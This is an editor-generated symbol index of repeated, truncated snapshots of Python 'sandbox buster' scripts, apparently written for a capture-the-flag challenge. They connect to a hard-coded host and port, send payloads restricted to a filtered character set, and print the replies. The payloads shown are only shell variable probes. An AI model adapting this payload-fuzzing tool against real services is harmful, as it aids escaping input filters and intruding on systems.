        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205039",
        "description": ".history.SandBox-Escape_20250515205039",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515205039",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205205",
        "description": ".history.SandBox-Escape_20250515205205",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515205205",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515205244",
        "description": ".history.SandBox-Escape_20250515205244",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515205244",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515210055",
        "description": ".history.SandBox-Escape_20250515210055",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515210055",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210609",
        "description": ".history.sandbox_buster_20250515210609",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210609",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210719",
        "description": ".history.sandbox_buster_20250515210719",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210719",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210740",
        "description": ".history.sandbox_buster_20250515210740",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210740",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
